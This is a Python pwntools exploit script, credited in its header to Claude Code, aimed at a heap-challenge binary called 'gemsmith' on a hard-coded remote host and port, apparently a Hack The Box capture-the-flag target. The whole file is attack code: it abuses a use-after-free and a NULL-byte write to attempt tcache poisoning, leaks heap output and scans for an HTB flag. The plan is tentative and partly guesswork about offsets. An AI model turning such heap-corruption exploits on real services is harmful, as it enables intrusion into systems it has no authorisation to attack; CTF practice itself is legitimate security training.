#!/usr/bin/env python3
"""
Focused exploitation via delete() function
Author: Claude Code
Purpose: Exploit UAF + NULL write through delete() operations
Created: 2025-11-23
Strategy: Use delete() since it's the only safe operation (calls success, not fail)

Key insight: delete() -> success() -> return (doesn't exit!)
            vs other errors -> fail() -> exit(0x520)

Exploitation plan:
1. Allocate chunk A (malloc returns heap chunk)
2. Delete chunk A (free to tcache, UAF - pointer still in buf[0]!)
3. Allocate chunk B with N bytes (NULL write at buf[bytes_read])
   - If we send right number of bytes, we NULL tcache metadata
4. Delete chunk B (corrupted tcache state)
5. Allocate again - might get arbitrary address
"""

from pwn import *

context.log_level = 'debug'

def attempt_exploitation(host='154.57.164.69', port=32593):
    """
    Attempt tcache poisoning via delete() UAF + NULL write
    """

    # Check if we should connect locally or remotely
    if host == 'local':
        p = process('./gemsmith')
    else:
        try:
            p = remote(host, port)
        except:
            log.error(f"Cannot connect to {host}:{port}")
            return

    def alloc(size, data):
        """Allocate with index 0"""
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b':', b'0')
        p.sendlineafter(b':', str(size).encode())
        p.sendlineafter(b':', data)
        log.info(f"Alloc: size={size}, data={data[:20]}")

    def delete():
        """Delete index 0 - calls success() not fail()!"""
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b':', b'0')
        log.success("Delete called (success path!)")

    def show():
        """Show index 0"""
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b':', b'0')
        output = p.recvuntil(b'>', timeout=2)
        log.info(f"Show output: {output[:100]}")
        return output

    # Exploitation sequence (14 operations max)
    ops_count = 0

    # Op 1: Allocate first chunk
    alloc(1056, b'AAAA')
    ops_count += 1
    log.info(f"Operations used: {ops_count}/14")

    # Op 2: Delete it (UAF - goes to tcache, pointer still in buf[0])
    delete()
    ops_count += 1
    log.info(f"Operations used: {ops_count}/14")
    log.success("Chunk in tcache, but buf[0] still points to it (UAF!)")

    # Op 3: Show to leak tcache fd pointer
    output = show()
    ops_count += 1
    log.info(f"Operations used: {ops_count}/14")

    if b'HTB{' in output:
        log.success("FLAG FOUND!")
        print(output.decode('utf-8', errors='replace'))
        p.close()
        return

    # Op 4-13: Try different byte counts to corrupt tcache
    # The tcache metadata is at specific offsets from buf
    for byte_count in [0, 8, 16, 24, 32, 40, 48, 56]:
        if ops_count >= 14:
            break

        log.info(f"Trying NULL write at byte_count={byte_count}")
        alloc(1056, b'B' * byte_count)
        ops_count += 1

        if ops_count >= 14:
            break

        # Show after corruption
        output = show()
        ops_count += 1

        if b'HTB{' in output:
            log.success("FLAG FOUND!")
            print(output.decode('utf-8', errors='replace'))
            p.close()
            return

    # Get final output
    try:
        final = p.recvall(timeout=3)
        log.info("Final output:")
        print(final.decode('utf-8', errors='replace'))

        if b'HTB{' in final:
            log.success("FLAG FOUND IN FINAL OUTPUT!")
    except:
        pass

    p.close()

if __name__ == '__main__':
    # First try to check server status
    import subprocess
    result = subprocess.run(['nc', '-zv', '154.57.164.69', '32593'],
                          capture_output=True, timeout=5)

    if b'refused' in result.stderr or result.returncode != 0:
        log.warning("Server not reachable, testing locally")
        attempt_exploitation('local', 0)
    else:
        log.info("Server reachable, exploiting remote")
        attempt_exploitation('154.57.164.69', 32593)
